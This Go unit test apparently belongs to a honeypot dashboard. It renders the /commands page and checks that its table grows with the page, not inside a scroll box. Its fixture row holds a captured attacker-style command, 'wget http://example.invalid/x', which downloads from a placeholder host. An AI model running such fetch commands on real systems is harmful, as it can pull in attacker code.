package main

import (
	"html/template"
	"strings"
	"testing"
	"time"
)

// TestCommandsPageTableFillsThePageLikeEventExplorerDoes: /commands is a
// single-card-per-page layout, same shape as /events -- #790 originally
// wrapped its table in card__scroll (a fixed-height, internally-scrolling
// box) to bound its growth, but that reads as "the card doesn't fill the
// page" against every other single-card page, /events chief among them,
// which lets its own "card wide" table grow with the page and never caps
// it. Reverted on direct request: this pins that the wrapper stays gone.
func TestCommandsPageTableFillsThePageLikeEventExplorerDoes(t *testing.T) {
	tmpl := template.Must(template.New("t").Funcs(templateFuncs(nil, "")).Parse(pageTemplate))

	page := commandsPage{
		Generated: time.Now(),
		Rows: []commandRow{
			{Sensor: "cowrie", Command: "wget http://example.invalid/x", Count: 3},
		},
	}
	var out strings.Builder
	if err := tmpl.ExecuteTemplate(&out, "commands", &page); err != nil {
		t.Fatalf("commands page does not execute: %v", err)
	}
	html := out.String()

	if strings.Contains(html, "card__scroll") {
		t.Fatal(`commands page must not wrap its table in .card__scroll -- the single-card layout should grow with the page (like /events' own table does), not be capped to a fixed-height internal scrollbox`)
	}
	if !strings.Contains(html, `id="commands-table"`) || !strings.Contains(html, "wget http://example.invalid/x") {
		t.Fatalf("commands table did not render the seeded row: %s", html)
	}
}
